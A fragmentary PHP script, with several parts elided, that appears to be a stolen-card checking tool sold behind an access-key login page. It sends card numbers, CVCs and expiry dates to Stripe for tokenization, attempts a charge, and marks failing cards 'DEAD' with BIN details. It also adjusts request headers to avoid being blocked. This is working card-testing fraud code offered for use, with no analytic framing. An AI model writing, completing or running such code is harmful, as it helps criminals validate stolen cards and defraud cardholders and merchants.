...
<form method="POST"><input type="text" name="key" placeholder="•••• •••• •••• ••••" required><button type="submit" name="login_key">ACTIVATE SYSTEM</button></form>
</div></body></html>
<?php exit; }
...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
    ...
    // Step 1: Stripe Tokenization (From your Python scripts)
    if($gate == "gate1") {
    ...
    curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query([
        'type' => 'card', 'billing_details[name]' => 'John Steve', 'card[number]' => $n, 
        'card[cvc]' => $cvc, 'card[exp_month]' => $mm, 'card[exp_year]' => $yy, 'key' => $pk
    ]));
    $res1 = json_decode(curl_exec($ch1), true);
    $pm = $res1['id'];

    if (!$pm) {
        $err = $res1['error']['message'] ?? "Tokenization Error";
        echo json_encode(["status" => "DEAD", "msg" => "$err $bin_info"]); exit;
    }

    // Step 2: Charge Process (Refined headers to avoid "No Response")
    if ($gate == "gate1") {
    ...
    curl_setopt($ch2, CURLOPT_TIMEOUT, 30); // အချိန် ၃၀ စက္ကန့်ပေးထားသည်
    ...
    $msg = $res2['message'] ?? "Gate Timeout or Blocked";
